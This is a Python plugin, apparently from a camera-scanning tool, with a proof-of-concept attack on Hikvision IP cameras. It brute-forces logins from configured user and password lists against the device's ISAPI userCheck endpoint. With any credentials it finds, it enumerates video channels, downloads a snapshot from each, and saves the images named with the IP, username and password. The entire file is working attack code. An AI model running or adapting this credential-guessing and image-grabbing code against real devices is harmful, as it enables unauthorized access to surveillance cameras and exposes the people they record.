import requests
from requests.auth import HTTPDigestAuth
from xml.etree import ElementTree

from loguru import logger

from .base import POCTemplate


class HikvisionWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['hikvision']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    r = requests.get(
                        url=f"http://{ip}:{port}/ISAPI/Security/userCheck",
                        auth=(user, password),
                        timeout=self.config.timeout,
                        headers=self.headers,
                        verify=False
                    )
                    if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        channels = 1
        try:
            res = requests.get(
                f"http://{ip}:{port}/ISAPI/Image/channels",
                auth=HTTPDigestAuth(user, password),
                headers=self.headers,
                timeout=self.config.timeout,
                verify=False
            )
            channels = len(ElementTree.fromstring(res.text))
        except Exception as e:
            logger.error(e)

        # 获取每个通道的图片
        res_list = []
        for channel in range(1, channels + 1):
            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/picture"
            img_file_name = f"{ip}-{port}-channel{channel}-{user}-{password}.jpg"
            res_list.append(
                self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))
            )
        return sum(res_list)


POCTemplate.register_poc(HikvisionWeakPassword)